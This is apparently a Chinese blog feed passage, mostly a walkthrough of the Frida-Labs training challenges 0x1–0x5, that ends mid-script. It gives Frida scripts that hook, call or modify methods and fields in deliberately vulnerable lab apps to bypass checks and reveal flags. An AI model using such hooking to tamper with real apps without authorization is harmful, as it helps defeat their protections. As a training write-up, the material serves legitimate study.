class="link"   href="https://www.mozilla.org/en-US/security/advisories/" >https://www.mozilla.org/en-US/security/advisories/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://developer.android.com/reference/android/app/ActivityManager" >https://developer.android.com/reference/android/app/ActivityManager<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://developer.android.com/guide/components/intents-filters?hl=zh-cn" >https://developer.android.com/guide/components/intents-filters?hl=zh-cn<i class="fas fa-external-link-alt"></i></a><br>Android 开源项目 (AOSP) 源代码 :<a class="link"   href="https://www.google.com/url?sa=E&q=https://cs.android.com/" >cs.android.com<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞简述&quot;&gt;&lt;a href=&quot;#漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;漏洞简述&quot;&gt;&lt;/a&gt;漏洞简述&lt;/h2&gt;&lt;p&gt;Firefox for Android（68.11.0 及更低版本）会发送定期发送SSDP信息，在其解析LCATION时没有</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Frida-Labs wp</title>
    <link href="http://arch3rn4r.github.io/2025/04/17/Frida-Labs-wp/"/>
    <id>http://arch3rn4r.github.io/2025/04/17/Frida-Labs-wp/</id>
    <published>2025-04-17T03:37:27.000Z</published>
    <updated>2025-05-02T02:41:58.837Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-同一个类中的静态方法"><a href="#0x1-同一个类中的静态方法" class="headerlink" title="0x1 同一个类中的静态方法"></a>0x1 同一个类中的静态方法</h2><p>分析<br>基本结构如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (TextUtils.isDigitsOnly(obj)) &#123;</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.check(i, Integer.parseInt(obj));</span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i * <span class="number">2</span>) + <span class="number">4</span> == i2) &#123;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>满足check的逻辑就可以，<code>i2=i*2+4</code><br>这里的check方法会主动触发，不需要额外调用，在这里，只需要更改原来check的逻辑就可以了</p><p>方法一<br>以下代码的编写是在jadx里直接“复制为frida片段”获得</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hookTest1 is called&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">        <span class="title class_">MainActivity</span>[<span class="string">&quot;check&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">i, i2</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`MainActivity.check is called: i=<span class="subst">$&#123;i&#125;</span>, i2=<span class="subst">$&#123;i2&#125;</span>`</span>);</span><br><span class="line">            i2=i*<span class="number">2</span>+<span class="number">4</span>;  <span class="comment">//在这里定义i2</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`i2 is changed to <span class="subst">$&#123;i2&#125;</span>`</span>);</span><br><span class="line">            <span class="variable language_">this</span>[<span class="string">&quot;check&quot;</span>](i, i2);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>方法二<br>以下代码调用Frida 的 JavaScript API。<br><strong>onMatch: function (instance) { … }</strong><br>该回调函数会在每次找到 className 指定的类的实例时被调用。<br><strong>nComplete: function () { … }</strong></p><ul><li>这个回调函数在 Frida 完成了对所有目标进程的内存扫描，并且枚举完所有 className 指定的类的实例之后被调用。</li><li>可以在 onComplete 函数中执行一些清理工作，或者打印一些总结信息。onComplete: function () {}，这意味着在枚举完成之后什么也不做。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] 找到 MainActivity 实例，自动触发解密&quot;</span>);</span><br><span class="line">        instance.<span class="title function_">check</span>(<span class="number">0</span>, <span class="number">4</span>); <span class="comment">// 传入 i=0, i2=4</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><p>方法三<br><strong>a.check.overload(‘int’, ‘int’).implementation &#x3D; function(a, b) { … }</strong></p><ul><li><strong>.overload(‘int’, ‘int’)</strong>: 指定要 hook 的 check 方法的重载版本。 check 方法可能存在多个重载版本，’int’, ‘int’ 表示选择接受两个 int 类型参数的版本。 这很重要，因为如果方法有多个重载，你必须明确指定要 hook 的版本。</li><li><strong>.implementation &#x3D; function(a, b) { … }</strong>: 设置 hook 的具体实现。 你在这里定义的函数将会在每次调用被 hook 的 check 方法时被执行。</li><li>this.originalMethod() 用于调用原始的方法（如果需要）<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">  a.<span class="property">check</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">check</span>(<span class="number">4</span>, <span class="number">12</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="0x2-主动调用同一个类中的静态方法"><a href="#0x2-主动调用同一个类中的静态方法" class="headerlink" title="0x2 主动调用同一个类中的静态方法"></a>0x2 主动调用同一个类中的静态方法</h2><p>主要逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(C0497R.layout.activity_main);</span><br><span class="line">        f103t1 = (TextView) findViewById(C0497R.id.textview);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">get_flag</span><span class="params">(<span class="type">int</span> a)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="number">4919</span>) &#123;</span><br><span class="line">           </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次目标方法不再原本的程序流程内，需要额外进行调用<br>java.choose和在jadx直接赋值frida片段都是调用的实例化对象，而get_flag没有被实例化</p><p>Java.choose 只能找到已经实例化的对象,所以这个代码不行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>,&#123;</span><br><span class="line">    <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">        instance.<span class="title function_">get_flag</span>(<span class="number">4919</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>方法一<br>Frida 的 Java.use 返回的类包装器对象（这里是 MainActivity）直接暴露了其静态成员（包括方法和字段），允许你像访问普通 JavaScript 对象的属性一样访问和调用它们。（它看起来非常像你在 Java 中直接编写 MainActivity.get_flag(4919);）<br>这个方法隐式的处理了上下文的关系，比方法二更简洁<br><class_reference>.&lt;方法&gt;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>那么实际操作就是</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">a.<span class="title function_">get_flag</span>(<span class="number">4919</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>方法二<br>核心是调用.call方法，此代码也可行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] 主动调用。。。&quot;</span>);</span><br><span class="line"><span class="title class_">MainActivity</span>.<span class="property">get_flag</span>.<span class="title function_">call</span>(<span class="title class_">MainActivity</span>, <span class="number">4919</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>调用<strong>静态</strong>方法时，.call 的第一个参数是<strong>类包装器</strong>；调用<strong>实例</strong>方法时，.call 的第一个参数是<strong>实例对象</strong></p><ul><li>对于 Java 的<strong>静态方法</strong>，它们不依赖于任何特定的对象实例，它们属于类本身。当你在 Frida 中使用 .call() 调用一个<strong>静态</strong> Java 方法时，你需要提供一个上下文。按照约定和实现，<strong>将类包装器本身 (MainActivity) 作为 this 上下文传递给 call 是正确的做法</strong>，它告诉 Frida 这个方法调用是针对这个类的静态上下文。</li></ul><h2 id="0x3同一个包下的不同类"><a href="#0x3同一个包下的不同类" class="headerlink" title="0x3同一个包下的不同类"></a>0x3同一个包下的不同类</h2><p>分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x3;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (Checker.code == <span class="number">512</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x3;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Checker</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">increase</span><span class="params">()</span> &#123;</span><br><span class="line">        code += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的check不再和主方法在一个类，但是在它的运行逻辑中<br>因此不需要主动调用，只需要更改它本身逻辑<br>(这里可以对照0x1的方法三)</p><p>思路一<br>循环调用checker的increase()方法来递增值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Checker</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;code当前值为&quot;</span>+<span class="title class_">Checker</span>.<span class="property">code</span>.<span class="property">value</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Checker</span>.<span class="property">code</span>.<span class="property">value</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">        <span class="title class_">Checker</span>.<span class="title function_">increase</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;触发函数后的值为&quot;</span>+<span class="title class_">Checker</span>.<span class="property">code</span>.<span class="property">value</span>);  </span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>思路二<br>把code直接改成512<br>修改值的模板如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> &lt;class_reference&gt; = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;&lt;package_name&gt;.&lt;class&gt;&quot;</span>);</span><br><span class="line">    &lt;class_reference&gt;.&lt;variable&gt;.<span class="property">value</span> = &lt;value&gt;;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>最终实现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);  <span class="comment">// class reference</span></span><br><span class="line">    a.<span class="property">code</span>.<span class="property">value</span> = <span class="number">512</span>;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="0x4-实例化"><a href="#0x4-实例化" class="headerlink" title="0x4 实例化"></a>0x4 实例化</h2><p>mainactivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x4;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(C0497R.layout.activity_main);</span><br><span class="line">        <span class="built_in">this</span>.f103t1 = (TextView) findViewById(C0497R.id.txtview);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x4;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Check</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get_flag</span><span class="params">(<span class="type">int</span> a)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="number">1337</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decoded);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次需要进行实例化<br><code>$new（）</code></p><p>模板</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> &lt;class_reference&gt; = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;&lt;package_name&gt;.&lt;class&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> &lt;class_instance&gt; = &lt;class_reference&gt;.$new(); <span class="comment">// Class Object</span></span><br><span class="line">  &lt;class_instance&gt;.&lt;method&gt;(); <span class="comment">// Calling the method</span></span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>使用效果<br>这样就可以在控制台打印flag</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> check = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> check_obj = check.$new(); <span class="comment">// Class Object</span></span><br><span class="line">  <span class="keyword">var</span> res = check_obj.<span class="title function_">get_flag</span>(<span class="number">1337</span>); <span class="comment">// Calling the method</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;FLAG &quot;</span> + res);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这个将会直接调用新的实例化后的静态方法，传入值然后直接解密，和MainActivity没关系了</p><h2 id="0x5-有上下文的实例化"><a href="#0x5-有上下文的实例化" class="headerlink" title="0x5 有上下文的实例化"></a>0x5 有上下文的实例化</h2><p>主要逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x5;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(C0497R.layout.activity_main);</span><br><span class="line">        <span class="built_in">this</span>.f103t1 = (TextView) findViewById(C0497R.id.textview);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">1337</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">this</span>.f103t1.setText(decryptedText);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="看起来可以模仿0x1的方法二"><a href="#看起来可以模仿0x1的方法二" class="headerlink" title="看起来可以模仿0x1的方法二"></a>看起来可以模仿0x1的方法二</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ad2001.frida0x5.MainActivity&quot;</span>,&#123;</span><br><span class="line">    <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] 找到实例，自动触发解密&quot;</span>);</span><br><span class="line">        instance.<span class="title function_">flag</span>(<span class="number">1337</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>但是出现了报错,报错如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[Pixel 4::Frida 0x5 ]-&gt;Error: java.lang.ClassNotFoundException: Didn&#x27;t find class &quot;com.ad2001.frida0x5.MainActivity&quot; on path: DexPathList[[directory &quot;.&quot;],nativeLibraryDirectories=[/system/lib64, /product/lib64, /system/lib64, /product/lib64]]       </span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:124)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:115)</span><br><span class="line">    at apply (native)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:97)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/class-factory.js:488)</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:949)</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:954)</span><br><span class="line">    at _make (frida/node_modules/frida-java-bridge/lib/class-factory.js:165)</span><br><span class="line">    at use (frida/node_modules/frida-java-bridge/lib/class-factory.js:62)</span><br><span class="line">    at _chooseObjectsArtPreA12 (frida/node_modules/frida-java-bridge/lib/class-factory.js:335)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/class-factory.js:303)</span><br><span class="line">    at kt (frida/node_modules/frida-java-bridge/lib/android.js:586)</span><br><span class="line">Error: java.lang.ClassNotFoundException: Didn&#x27;t find class &quot;com.ad2001.frida0x5.MainActivity&quot; on path: DexPathList[[directory &quot;.&quot;],nativeLibraryDirectories=[/system/lib64, /product/lib64, /system/lib64, /product/lib64]]       </span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:124)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:115)</span><br><span class="line">    at apply (native)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:97)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/class-factory.js:488)</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:949)</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:954)</span><br><span class="line">    at _make (frida/node_modules/frida-java-bridge/lib/class-factory.js:165)</span><br><span class="line">    at use (frida/node_modules/frida-java-bridge/lib/class-factory.js:62)</span><br><span class="line">    at _chooseObjectsArtPreA12 (frida/node_modules/frida-java-bridge/lib/class-factory.js:335)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/class-factory.js:303)</span><br><span class="line">    at kt (frida/node_modules/frida-java-bridge/lib/android.js:586)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原因如下；因为 flag 方法内部执行了 this.f103t1.setText()，这是一个 UI 操作。<strong>UI 操作必须在 Android 的主线程（UI 线程）执行。</strong> 因此，你需要将调用包装在 Java.scheduleOnMainThread 中，否则可能会遇到 CalledFromWrongThreadException 错误。<br>改进后的脚本<br><strong>Hook 一个晚期方法:</strong> Hook 一个已知在 MainActivity 加载后肯定会执行的方法（例如 Activity.onResume），然后在该 Hook 内部执行 Java.choose</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 